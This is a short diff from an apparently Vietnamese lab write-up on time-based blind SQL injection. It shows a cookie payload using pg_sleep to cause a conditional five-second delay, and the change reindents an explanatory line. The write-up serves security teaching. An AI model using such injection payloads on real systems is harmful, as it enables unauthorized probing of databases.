@@ -17,7 +17,7 @@ Yêu cầu của bài lab:
 
 TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--
 
-+ 1=1 luôn đúng.
+  + 1=1 luôn đúng.
 
 + Hệ quả: câu lệnh sẽ gọi pg_sleep(5), ứng dụng mất 5 giây để phản hồi.
 
